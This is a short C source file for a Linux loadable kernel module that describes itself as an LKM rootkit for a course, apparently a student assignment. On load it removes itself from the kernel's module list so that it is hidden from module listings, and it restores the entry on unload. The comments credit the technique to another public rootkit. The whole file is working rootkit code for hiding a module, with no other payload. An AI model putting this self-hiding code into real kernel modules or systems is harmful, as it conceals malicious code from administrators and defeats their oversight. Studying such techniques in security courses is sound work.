#include <linux/init.h>
#include <linux/module.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("kytan");
MODULE_DESCRIPTION("An LKM rootkit for COMP 3632");
MODULE_VERSION("0.1");


static short is_hidden;
static struct list_head* prev_module;


/*
Not my idea. Based on module_hide from
https://github.com/ivyl/rootkit/blob/master/rt.c
*/
// Hide this LKM rootkit itself
static void hide_itself(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}


/*
Not my idea. Based on module_show from
https://github.com/ivyl/rootkit/blob/master/rt.c
*/
// Unhide this LKM rootkit itself
static void unhide_itself(void) {
    if (is_hidden) {
        list_add(&THIS_MODULE->list, prev_module);
    }
}


static int __init init_rootkit(void) {
    is_hidden = 0;
    hide_itself();

    printk(KERN_INFO "[INIT] Hello rootkit.\n");
    return 0;
}


static void __exit exit_rootkit(void) {
    unhide_itself();

    printk(KERN_INFO "[EXIT] Goodbye rootkit.\n");
}


module_init(init_rootkit);
module_exit(exit_rootkit);